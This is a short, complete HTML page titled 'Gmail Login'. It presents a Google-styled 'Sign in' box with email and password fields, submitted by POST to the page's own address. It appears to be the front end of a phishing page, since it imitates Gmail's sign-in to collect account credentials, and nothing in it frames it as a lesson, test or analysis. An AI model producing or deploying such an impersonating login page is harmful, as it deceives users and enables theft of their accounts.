<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Gmail Login</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f2f2f2;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .login-box {
      background: white;
      padding: 40px;
      border-radius: 10px;
      box-shadow: 0 0 10px #ccc;
      width: 300px;
    }
    input {
      width: 100%;
      padding: 10px;
      margin: 10px 0;
    }
    button {
      width: 100%;
      padding: 10px;
      background-color: #1a73e8;
      color: white;
      border: none;
    }
  </style>
</head>
<body>
  <div class="login-box">
    <h2>Sign in</h2>
    <form method="POST">
      <input name="email" type="email" placeholder="Email or phone" required />
      <input name="password" type="password" placeholder="Password" required />
      <button type="submit">Next</button>
    </form>
  </div>
</body>
</html>
